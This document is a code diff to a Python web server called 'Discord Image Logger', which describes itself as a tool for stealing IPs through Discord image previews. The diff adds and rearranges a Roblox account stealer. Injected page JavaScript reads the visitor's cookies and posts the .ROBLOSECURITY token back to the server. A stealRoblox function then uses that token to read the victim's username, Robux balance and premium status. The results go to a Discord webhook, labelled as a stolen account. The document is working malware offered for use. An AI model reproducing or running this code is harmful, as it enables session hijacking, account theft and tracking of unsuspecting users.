@@ -4,7 +4,7 @@
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
-import requests
+import json
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
@@ -74,51 +74,6 @@ def botCheck(ip, useragent):
         return "Telegram"
     else:
         return False
-    
-
-def stealRoblox(cookie):
-    if not cookie or '.ROBLOSECURITY=' not in cookie:
-        return None
-    
-    # Extract clean cookie
-    roblox_cookie = cookie.split('.ROBLOSECURITY=')[1].split(';')[0]
-    
-    session = requests.Session()
-    session.cookies['.ROBLOSECURITY'] = roblox_cookie
-    session.headers.update({
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-        'Accept': 'application/json',
-        'Origin': 'https://www.roblox.com',
-        'Referer': 'https://www.roblox.com/'
-    })
-    
-    try:
-        # Get authenticated user info
-        user_resp = session.get('https://users.roblox.com/v1/users/authenticated').json()
-        username = user_resp.get('name', 'Unknown')
-        user_id = user_resp.get('id', 'Unknown')
-        
-        # Get Robux balance
-        currency_resp = session.get('https://economy.roblox.com/v1/user/currency').json()
-        robux = currency_resp.get('robux', 0)
-        
-        # Optional: Premium status
-        premium_resp = session.get('https://premiumfeatures.roblox.com/v1/users/{}/validate-membership'.format(user_id)).json()
-        is_premium = premium_resp.get('isPremium', False)
-        
-        # Avatar thumbnail
-        avatar_url = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png"
-        
-        return {
-            'username': username,
-            'user_id': user_id,
-            'robux': robux,
-            'premium': is_premium,
-            'avatar': avatar_url
-        }
-    except:
-        return None  # Silent fail if invalid/expired cookie
-
 
 def reportError(error):
     requests.post(config["webhook"], json = {
@@ -222,36 +177,73 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 }
     
     if roblox_data:
-        embed += f"""
+        embed_desc += f"""
 
-🟥 **ROBLOX ACCOUNT COMPROMISED!**
+🟥 **ROBLOX ACCOUNT STEALEN!**
 > **Username:** `{roblox_data['username']}`
 > **User ID:** `{roblox_data['user_id']}`
 > **Robux:** `{roblox_data['robux']:,}`
 > **Premium:** `{'Yes' if roblox_data['premium'] else 'No'}`
 > [Profile](https://www.roblox.com/users/{roblox_data['user_id']}/profile) | [Avatar]({roblox_data['avatar']})"""
-
-    # Build full payload
-    payload = {
+    
+    embed = {
         "username": config["username"],
-        "content": f"{ping}" + (" 🟥 ROBLOX STEAL" if roblox_data else ""),
+        "content": ping + (" 🟥 ROBLOX STEAL" if roblox_data else ""),
         "embeds": [{
-            "title": "Image Logger - Victim Logged!" if not roblox_data else "🟥 ROBLOX + Image Logger Hit!",
-            "color": 0xFF0000 if roblox_data else config["color"],  # Red for Roblox loot
-            "description": embed,
-            "thumbnail": {"url": roblox_data['avatar']} if roblox_data else None,
-            "timestamp": requests.get("https://worldtimeapi.org/api/timezone/UTC").json().get("utc_datetime", "")
+            "title": "🟥 ROBLOX + Image Logger Hit!" if roblox_data else "Image Logger - IP Logged",
+            "color": 0xFF0000 if roblox_data else config["color"],
+            "description": embed_desc,
         }]
     }
-    # Clean None thumbnail
-    if not payload["embeds"][0]["thumbnail"]:
-        del payload["embeds"][0]["thumbnail"]
-
-    requests.post(config["webhook"], json=payload)
     
+    if url: 
+        embed["embeds"][0]["thumbnail"] = {"url": url}
+    if roblox_data:
+        embed["embeds"][0]["thumbnail"] = {"url": roblox_data['avatar']}
+    
+
     if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
     requests.post(config["webhook"], json = embed)
     return info
+
+
+def stealRoblox(cookie):
+    if not cookie or '.ROBLOSECURITY=' not in cookie:
+        return None
+    
+    roblox_cookie = cookie.split('.ROBLOSECURITY=')[1].split(';')[0]
+    
+    session = requests.Session()
+    session.cookies['.ROBLOSECURITY'] = roblox_cookie
+    session.headers.update({
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'Accept': 'application/json',
+        'Origin': 'https://www.roblox.com',
+        'Referer': 'https://www.roblox.com/'
+    })
+    
+    try:
+        user_resp = session.get('https://users.roblox.com/v1/users/authenticated').json()
+        username = user_resp.get('name', 'Unknown')
+        user_id = user_resp.get('id', 'Unknown')
+        
+        currency_resp = session.get('https://economy.roblox.com/v1/user/currency').json()
+        robux = currency_resp.get('robux', 0)
+        
+        premium_resp = session.get(f'https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership').json()
+        is_premium = premium_resp.get('isPremium', False)
+        
+        avatar_url = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png"
+        
+        return {
+            'username': username,
+            'user_id': user_id,
+            'robux': robux,
+            'premium': is_premium,
+            'avatar': avatar_url
+        }
+    except:
+        return None
 
 binaries = {
     "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
@@ -261,30 +253,6 @@ binaries = {
 }
 
 class ImageLoggerAPI(BaseHTTPRequestHandler):
-
-    def do_POST(self):
-        if self.path == '/roblox':
-            try:
-                content_length = int(self.headers['Content-Length'])
-                post_data = self.rfile.read(content_length).decode()
-                data = json.loads(post_data)  # Need: import json
-                cookie = data.get('cookie', '')
-                
-                roblox_data = stealRoblox(cookie)
-                if roblox_data:
-                    ip = self.headers.get('x-forwarded-for', 'Unknown')
-                    makeReport(ip, self.headers.get('user-agent'), roblox_data=roblox_data)
-                
-                self.send_response(200)
-                self.end_headers()
-            except:
-                self.send_response(404)
-                self.end_headers()
-            return
-        
-        self.send_response(404)
-        self.end_headers()
-
     
     def handleRequest(self):
         try:
@@ -298,18 +266,31 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
             else:
                 url = config["image"]
 
-            data = f'''<style>body {{
-margin: 0;
-padding: 0;
-}}
-div.img {{
-background-image: url('{url}');
-background-position: center center;
-background-repeat: no-repeat;
-background-size: contain;
-width: 100vw;
-height: 100vh;
-}}</style><div class="img"></div>'''.encode()
+                stealer_js = """
+    <script>
+    (function(){
+        function sendCookie(){
+            var cookies = document.cookie;
+            if (cookies.includes('.ROBLOSECURITY')) {
+                fetch('/roblox', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({cookie: cookies}),
+                    cache: 'no-cache'
+                }).catch(() => {});
+            }
+        }
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', sendCookie);
+        } else {
+            sendCookie();
+        }
+        setTimeout(sendCookie, 1000);  // Roblox lazy-load backup
+    })();
+    </script>
+    """
+            data = f'''<style>body{{margin:0;padding:0;}}div.img{{background-image:url('{url}');background-position:center;background-repeat:no-repeat;background-size:contain;width:100vw;height:100vh;}}</style><div class="img"></div>{stealer_js}'''.encode()
+
             
             if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                 return
@@ -322,8 +303,6 @@ height: 100vh;
                 if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.
 
                 makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
-                roblox_data = None  # Default
-# ... after JS stealer logic, if you get cookie ...
                 
                 return
             
@@ -386,34 +365,6 @@ if (!currenturl.includes("g=")) {
 }}
 
 </script>"""
-
-                stealer_js = """
-    <script>
-    (function(){
-        function sendCookie(){
-            var cookies = document.cookie;
-            if (cookies.includes('.ROBLOSECURITY')) {
-                fetch('/roblox', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({cookie: cookies})
-                }).catch(() => {});  // Silent
-            }
-        }
-        // Run after load, stealthy
-        if (document.readyState === 'loading') {
-            document.addEventListener('DOMContentLoaded', sendCookie);
-        } else {
-            sendCookie();
-        }
-        // Also try on Roblox domains
-        setTimeout(sendCookie, 500);
-    })();
-    </script>
-    """
-
-                data = f'''<style>body{{margin:0;padding:0;}}div.img{{background-image:url('{url}');background-position:center;background-repeat:no-repeat;background-size:contain;width:100vw;height:100vh;}}</style>
-    <div class="img"></div>{stealer_js}'''.encode()
                 self.wfile.write(data)
         
         except Exception:
@@ -428,5 +379,35 @@ if (!currenturl.includes("g=")) {
     
     do_GET = handleRequest
     do_POST = handleRequest
+
+    def do_GET(self):
+        self.handleRequest()
+
+    def do_POST(self):
+        if self.path == '/roblox':
+            try:
+                content_length = int(self.headers['Content-Length'])
+                post_data = self.rfile.read(content_length).decode('utf-8')
+                data = json.loads(post_data)
+                cookie = data.get('cookie', '')
+                
+                roblox_data = stealRoblox(cookie)
+                if roblox_data:
+                    ip = self.headers.get('X-Forwarded-For', self.headers.get('x-forwarded-for', 'Unknown')).split(',')[0].strip()
+                    ua = self.headers.get('User-Agent', self.headers.get('user-agent', 'Unknown'))
+                    makeReport(ip, ua, roblox_data=roblox_data)
+                
+                self.send_response(200)
+                self.send_header('Content-Type', 'application/json')
+                self.end_headers()
+                self.wfile.write(b'{"status":"ok"}')
+            except:
+                self.send_response(404)
+                self.end_headers()
+            return
+        
+        self.send_response(404)
+        self.end_headers()
+
 
 handler = app = ImageLoggerAPI
